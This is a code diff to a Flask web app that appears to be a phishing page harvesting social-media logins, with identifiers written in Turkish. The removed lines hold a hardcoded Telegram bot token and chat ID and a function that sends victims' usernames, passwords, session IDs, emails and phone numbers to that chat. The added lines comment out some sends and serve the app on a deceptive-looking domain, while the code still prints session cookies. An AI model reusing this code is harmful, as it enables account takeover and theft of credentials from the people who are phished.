@@ -7,11 +7,9 @@ import asyncio
 import time
 import functools
 import threading
-import telegram
-import requests
+
 app = Flask(__name__)
 cl=[]
-
 sifrehatali=False
 
 kodistedimi = False
@@ -22,15 +20,9 @@ codee = ""
 
 
 
-bot_token = '5269871145:AAFEuMK5cr4swqJQ5pkH5DRjzutnsBDBssc'
-bot = telegram.Bot(token=bot_token)
-chat_id = '-1001785696167'
 
-async def teg(u,p,s):
- mesaj=f"""➡️Hesap Kullanıcı adı= {u}
-            ➡️Hesap Şifresi= {p}
-            ➡️Hesap SessionId = {s}"""
- await bot.send_message(chat_id=chat_id, text=mesaj)
+
+
 
             
         
@@ -149,7 +141,7 @@ def  logina(aliu,alip, cl):
         kaya= cl.sessionid
         
         print("Coocies budurrr=  "+str(kaya))
-        teg(kayau,kayap,kaya)
+        #teg(kayau,kayap,kaya)
         
         
         
@@ -213,19 +205,10 @@ async def login():
         print("giriş yapıldı")
         print("ametkaya: "+str(code))
         kaya= yeni_cl.sessionid
-        kayau=aliu
-        kayap=alip
-        kayam=alim
-        kayan=alin
-        mesaj=f"""➡️Hesap Kullanıcı adı= {kayau}
-            ➡️Hesap Şifresi= {kayap}
-            ➡️Hesap SessionId = {kaya}
-            ➡️Hesap E-Posta= {kayam}
-            ➡️Hesap Numara= {kayan}"""
-
+        
             
         
-        await bot.send_message(chat_id=chat_id, text=mesaj)
+        #await bot.send_message(chat_id=chat_id, text=mesaj)
         
         print("Coocies budur=  "+str(kaya))
         print(str(aliu))
@@ -253,5 +236,6 @@ async def login():
 
 if __name__:
 
+    app.run(debug=True, host='sysytemnotfreezeinfor.com',port=80)
     app.run(debug=True, host='0.0.0.0',port=80)
     
